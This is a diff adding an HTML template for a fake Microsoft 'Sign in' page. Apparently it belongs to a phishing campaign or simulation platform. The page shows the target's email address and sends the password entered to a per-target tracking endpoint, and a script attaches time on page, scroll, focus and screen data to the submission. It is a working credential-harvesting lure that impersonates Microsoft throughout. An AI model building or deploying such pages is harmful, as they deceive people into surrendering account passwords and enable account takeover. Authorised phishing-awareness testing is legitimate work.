@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+  .box{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.18);margin:auto}
+  .ms-logo{display:flex;align-items:center;margin-bottom:24px;gap:10px}
+  .ms-squares{display:grid;grid-template-columns:1fr 1fr;gap:3px;width:22px;height:22px;flex-shrink:0}
+  .ms-squares div:nth-child(1){background:#f25022}
+  .ms-squares div:nth-child(2){background:#7fba00}
+  .ms-squares div:nth-child(3){background:#00a4ef}
+  .ms-squares div:nth-child(4){background:#ffb900}
+  .ms-wordmark{font-size:20px;font-weight:600;color:#1b1b1b;letter-spacing:-.5px}
+  h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}
+  .acct{font-size:15px;color:#1b1b1b;margin-bottom:20px}
+  label{display:block;font-size:13px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+  input[type=password]{width:100%;padding:7px 8px;border:1px solid #8a8886;font-size:15px;color:#1b1b1b;outline:none;margin-bottom:16px}
+  input[type=password]:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}
+  .options{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+  .checkbox-row{display:flex;align-items:center;gap:8px;font-size:13px;color:#1b1b1b}
+  .forgot{font-size:13px;color:#0078d4;text-decoration:none}
+  .forgot:hover{text-decoration:underline}
+  .btn-primary{background:#0078d4;color:#fff;border:none;width:100%;padding:10px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:16px}
+  .btn-primary:hover{background:#106ebe}
+  .footer-links{display:flex;gap:16px;flex-wrap:wrap;margin-top:24px}
+  .footer-links a{font-size:12px;color:#0078d4;text-decoration:none}
+  footer{padding:16px;text-align:center;font-size:12px;color:#8a8886}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="ms-logo">
+    <div class="ms-squares"><div></div><div></div><div></div><div></div></div>
+    <span class="ms-wordmark">Microsoft</span>
+  </div>
+  <h1>Sign in</h1>
+  <p class="acct">{{ ct.target.email }}</p>
+  <form method="post" action="{% url 'tracking:submit' name=name token=token %}">
+    {% csrf_token %}
+    <input type="hidden" name="email" value="{{ ct.target.email }}">
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" autocomplete="current-password" autofocus>
+    <div class="options">
+      <label class="checkbox-row"><input type="checkbox"> Keep me signed in</label>
+      <a class="forgot" href="#">Forgot password?</a>
+    </div>
+    <button class="btn-primary" type="submit">Sign in</button>
+  </form>
+  <div class="footer-links">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <a href="#">...</a>
+  </div>
+</div>
+<footer>© Microsoft 2025</footer>
+<script>
+(function(){
+  var t0=Date.now(),sc=0,fc=0;
+  window.addEventListener('scroll',function(){sc=1;},{passive:true,once:true});
+  document.addEventListener('focusin',function(e){if(e.target&&e.target.tagName==='INPUT')fc++;});
+  var form=document.querySelector('form');
+  if(form)form.addEventListener('submit',function(){
+    function add(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;form.appendChild(i);}
+    add('_t_time',Math.round((Date.now()-t0)/1000));
+    add('_t_scroll',sc);
+    add('_t_focus',fc);
+    add('_t_screen',screen.width+'x'+screen.height);
+  });
+})();
+</script>
+</body>
+</html>
